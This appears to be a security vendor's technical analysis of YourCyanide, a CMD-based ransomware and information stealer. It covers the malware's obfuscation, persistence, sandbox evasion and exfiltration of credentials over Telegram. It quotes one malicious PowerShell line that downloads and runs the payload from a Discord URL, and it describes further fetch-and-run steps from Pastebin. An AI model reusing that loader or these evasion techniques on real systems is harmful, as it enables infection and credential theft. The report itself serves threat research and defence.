report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
chapter_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation
text: The Trend Micro Threat Hunting team recently analyzed a series of CMD-based ransomware variants with a number capabilities such as stealing user information, bypassing remote desktop connections, and propagating through email and physical drives.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
chapter_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation
text: In this blog entry, we will analyze YourCyanide, the latest variant of the CMD-based ransomware family that started with GonnaCope. YourCyanide is a sophisticated ransomware that integrates PasteBin, Discord, and Microsoft document links as part of its payload download routine. YourCyanide contains multiple layers of obfuscation and takes advantage of custom environment variables and the Enable Delayed Expansion function to hide its activities. As part of its evasion strategy, YourCyanide will also pass through different files, downloading the succeeding files via Discord and Pastebin with each step before eventually downloading the main payload.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
chapter_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation
text: Note that the ransomware is still currently under development, so some portions of the routine like the actual encryption portion are not finalized (YourCyanide currently renames the files under specific directories, but does not encrypt anything).

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
chapter_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation
text: Figure 1. An Obfuscated batch script

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
chapter_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation
text: The earliest sample of this ransomware, known as GonnaCope, was found by Twitter user Petrovic in April 2022. This variant possessed the ability to overwrite its victim's files however, this was limited to the current directory in which the ransomware was being executed.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
chapter_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation
text: Upon checking the latest variant of this malware, we observed that the malware author was sending messages to all users in the compromised network notifying them of the infiltration. Along with this, another message was sent stating that "Kekware and Kekpop were just the begining" indicating that the author was preparing a more sophisticated variant of the original ransomware.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
chapter_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation
text: Figure 2. A message warning victims of potentially more sophisticated variants of the ransomware

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
chapter_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation
text: Table 1 shows when the additional variants of the original CMD/BAT-based ransomware were uploaded to VirusTotal.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
chapter_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation
text: Table 1. CMD-based ransomware samples and their date of upload to VirusTotal

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 3. YourCyanide infection routine

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 4. Exfiltration of stolen information

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: It initially arrives as an LNK file that contains the following PowerShell script for downloading the "YourCyanide.exe" 64-bit executable from Discord and executing it: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "(New-Object Net.WebClient).DownloadFile('hxxps://cdn.discordapp.com/attachments/974799607894769704/975527548983341056/YourCyanide.exe', 'YourCyanide.exe')"; start YourCyanide.exe"

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 5. LNK file containing the shellcode

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: This 64-bit executable file creates and executes a CMD file with the filename YourCyanide.cmd.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 6. Creating and executing YourCyanide.cmd

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: The dropped YourCyanide.cmd file contains a script downloaded from Pastebin that is saved using the same filename ().

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 7. Code snippets from the YourCyanide.cmd file

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: The ransomware will create a registry key in HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce for cleanup purposes. It then runs advpack.dll to delete the folder containing the malicious CMD file to remove traces of the downloader from the machine.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 8. Creating a registry key for cleanup

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: The downloaded script file contains 10 layers of obfuscated code, with each layer being needed to deobfuscate the succeeding layer. It takes advantage of the Enable Extensions and Enable Delayed Extensions commands, causing variables within a batch file to be expanded at execution time rather than at parse time.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: The malware uses following format for its obfuscation technique:

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: %parameter:~index of character, number of characters to take%

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: %Kesik:~19,1%, will return 1 character from the index value 19 of parameter Kesik

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 9. Code snippets showing Enable Extensions and Enable Delayed Extensions commands

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Upon execution, YourCyanide sets its file attributes as hidden and as a system file, then launches five maximized Command Prompt windows.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 10. Launching five maximized Command Prompt windows

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: It will then try to add a user "session" to the Administrators group using the net localgroup command.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 11. The net localgroup command being run

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: It also creates an autostart mechanism for persistence by creating a registry key in HKLM\Software\Microsoft\Windows\CurrentVersion\Run and then copying itself to the Startup directory. It also disables Task Manager by modifying its registry entry.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 12. Code snippet showing YourCyanide creating a registry key and copying itself to the Startup directory for persistence.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: It then checks if %SystemDrive%\AutoExec.bat exists, and if so, it deletes the original and then copies itself and sets the file to read only, hidden, and as a system file.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: It also avoids machines with the following usernames, some of which, according to our research, are usernames used by malware researchers and sandbox systems implying that the malware author is noting which machines should be evaded:

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: a.monaldo George george help karolisliucveikis Soumy guent

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: After checking the username of the infected machine, it drops and executes a batch file in UserProfile\Documents\black.bat. This batch file is responsible for continuously opening the Blank Screen Saver file, which renders the machine inaccessible while the malware is running.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 13. Dropping and executing the batch file

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: YourCyanide also terminates several services and security applications by concatenating variables to form the strings "net stop," "norton," "symantec," and "McAfee."

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 14. Code snippet showing YourCyanide stopping services and security software

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: It then swaps the mouse button using the SwapMouseButton Export function of the user32.dll file.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: After terminating applications, it renames files from the following directories to <Random>.<file extension>.<Random>.cyn:

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: %MyDesktop% %MyDocuments% %MyMusic% %MyPictures% %MyVideos% %Downloads%

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Although no actual encryption is being performed, users will still be heavily inconvenienced due to their files being renamed especially for those with large amounts of files in these particular folders. Furthermore, since the malware is still currently under development, its likely that the malware authors are still finalizing the encryption portion of the routine.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: It then creates the following ransom notes and drops them into %MyDesktop%:

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: YcynNote.txt other.txt

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 15. The ransom notes dropped by YourCyanide (including the warning shown in Figure 2)

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: It features two instances in which it copies itself to batch files and then appends the malicious code (shown in Figure 16) to win.ini and system.ini.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 16. The malicious code that are appended to win.ini and system.ini

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: After performing its routine, it deletes the black.bat file in the %MyDocuments% directory, which is responsible for rendering the machine inaccessible. Deleting the file will stop the blank screen saver file from continuously opening.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 17. The black.bat file responsible for rendering the infected machine inaccessible

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: YourCyanide is also capable of spreading via email and to different drives. It creates two VBScript files, mail.vbs and loveletter.vbs, that send an email using the following subjects (with itself as an attachment):

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: I Have a crush on you Check This Out

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: It then copies itself to the following drives or directories:

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: D: E: F: G: H: %UserProfile%

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
chapter_title: Bypassing remote desktop connections and firewalls
text: YourCyanide enables Remote Desktop Connection (RDP) by using the netsh commands shown in Figure 18.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
chapter_title: Bypassing remote desktop connections and firewalls
text: Figure 18. Using netsh commands for RDP connection

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
chapter_title: Bypassing remote desktop connections and firewalls
text: The ransomware opens multiple local ports by adding firewall rules for Transmission Control Protocol (TCP) and User Datagram Protocol (UDP) connections via the netsh advfirewall function.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
chapter_title: Bypassing remote desktop connections and firewalls
text: Figure 19. Opening multiple local ports

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
chapter_title: Bypassing remote desktop connections and firewalls
text: It then downloads and executes another CMD file (ycynlog.cmd) from hxxps://pastebin[.]com/raw/2K5m42Xp.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: The ycynlog.cmd file is responsible for the collection and exfiltration of stolen information from the compromised machine. Like the main file, it also features multiple layers of obfuscation. Upon execution, the file hides itself and creates its autostart mechanism by producing a registry key in HKLM\Software\Microsoft\Windows\CurrentVersion\Run, and by copying itself to the Startup directory.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: The malware uses the Telegram chatbot API to exfiltrate the stolen information and sets it to variable "Webhook"

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 20. Using the Telegram Chatbot API for data exfiltration

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: It downloads another executable from Discord (GetToken.exe). Running this executable creates the file MyTokens.txt, which contains stolen access token data from different applications such as Chrome, Discord, and Microsoft Edge.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 21. Downloading GetToken.exe

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: It also collects the following machine information and stores it in userdata.txt:

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: IP addresses MAC addresses CPU Information Memory Size Partition information System specifications OS product key Currently running processes

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Both Tokens.txt and userdata.txt will then be sent via Telegram chatbot API using the curl command.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: We also discovered that YourCyanide exfiltrates Minecraft-related credentials.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 22. Exfiltrating Minecraft-related credentials

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Finally, it downloads another executable from Google Docs and executes it using the parameter "/stext ForME.txt". ForMe.txt will then be sent to the Telegram chatbot. While the Google Docs link is currently inaccessible, and therefore a sample can't be sourced, we noticed that it is run using the same parameter as the sample "passwords.exe," which is also used by the earlier Kekpop variant. The parameter "/stext" is employed when executing the file, which is similar to the WebBrowserPassView application used to retrieve credentials stored by various web browsers such as Internet Explorer (Version 4.0 - 10.0), Mozilla Firefox (all versions), Google Chrome, Safari, and Opera.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figuring 23. Downloading the executable from Google Docs

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: The file created from executing passwords.exe contains saved passwords that are stored in Google Chrome.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 24. The file created from executing passwords.exe

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Of the usernames this malware avoids, three in particular stand out. Namely: a.monaldo, karolisliucveikis, and soumy. Upon further research, we discovered that these are usernames from sandbox environments.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: a.monaldo

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: The username of the sandbox machine used by Hunter Yomi

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 25. Screenshot showing the a.monaldo username Image from yomi.yoroi.company

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: karolisliucveikis

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: The username of the sandbox machine used by PCRisk

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 26. Screenshot showing the karolisliucveikis username Image from pcrisk.com

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: soumy

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 27. Screenshot showing the soumy username Image from sonicwall.com

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: The team analyzed these CMD-based ransomwares and came up with the following table that compares each variant and their differences. One notable difference is that GonnaCope, the earliest variant, does not collect user credentials from web browsers and list of applications, and does not enable RDP connections. Furthermore, it does not execute black.bat, the file that temporarily causes the machine to become inaccessible while the malware executes its payload. We also observed that the BTC address used by GonnaCope is different from the BTC address of the succeeding variants and it contains a different ransom note format. The variants also differ in their delivery shifting between arriving as an archive, executable files, or LNK files that drop the CMD-based ransomware. The payloads are also located in different parts of the chain, with some being found in the main CMD file, while others are found in files that are downloaded from Pastebin and Discord.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: The continued use of heavily obfuscated script results in very low detections for these CMD-based ransomware, making it easier to compromise their victims machines. Even if the technique is not new, the use of multilayer custom environment variables for obfuscation is highly effective in avoiding detection. These ransomware variants are also capable of downloading multiple payloads, performing lateral movement via emails, and using Discord, Pastebin and even Microsoft document links.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Figure 28. Low detections of CMD-based ransomware

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: From our analysis, we are able to infer that the malware author is actively monitoring the reports created by malware researchers by taking note of the usernames found in their sandbox logs and reports, and including them in the evasion list of usernames and machines that is part of the initialization process of the malware being used.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Ransomware variants that possess multiple capabilities such as the one analyzed in this blog entry are gaining popularity. While YourCyanide and its other variants are currently not as impactful as other families, it represents an interesting update to ransomware kits by bundling a worm, a ransomware, and an information stealer into a single mid-tier ransomware framework.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: It is also likely that these ransomware variants are in their development stages, making it a priority to detect and block them before they can evolve further and do even more damage.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: A multilayered approach can help organizations defend against ransomware attacks using security technologies that can detect malicious components and suspicious behavior.

report_title: YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation. YourCyanide technical analysis
text: Trend Micro Vision One provides multilayered protection and behavior detection, which helps block suspicious behavior and tools before the ransomware can do any damage. Trend Micro Cloud One Workload Security protects systems against both known and unknown threats that exploit vulnerabilities through virtual patching and machine learning. Trend Micro Deep Discovery Email Inspector employs custom sandboxing and advanced analysis techniques to effectively block malicious emails that can serve as entry points for ransomware. Trend Micro Apex One offers automated threat detection and response against advanced concerns such as fileless threats and ransomware, ensuring endpoint protection.
